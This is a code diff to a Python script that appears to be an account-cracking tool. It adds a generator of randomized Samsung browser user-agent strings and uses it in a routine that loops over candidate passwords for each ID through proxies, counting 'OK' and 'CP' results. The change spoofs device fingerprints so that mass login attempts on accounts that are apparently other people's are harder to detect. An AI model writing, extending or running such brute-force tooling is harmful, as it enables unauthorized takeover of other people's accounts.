@@ -95,6 +95,18 @@ except Exception as e:
 prox=open('.prox.txt','r').read().splitlines()
 
 ###----------[ GENERATE USERAGENT ]---------- ###
+def samsung():
+	rr = random.randint
+	rc = random.choice
+	S = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	A = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	M = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	S = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	U = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-T580) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Safari/537.36"
+	N = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-J320FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	G = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; SAMSUNG SM-G973F/G973FXXSEFUL1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(10,20))}.0 Chrome/{str(rr(100,110))}.0.{str(rr(1000,9000))}.{str(rr(100,900))} Mobile Safari/537.36"
+	return random.choice([S,A,M,S,U,N,G])
+
 
 for xd in range(10000):
     rr = random.randint; rc = random.choice
@@ -1391,7 +1403,7 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua=random.choice(free)
+	ua=samsung()
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
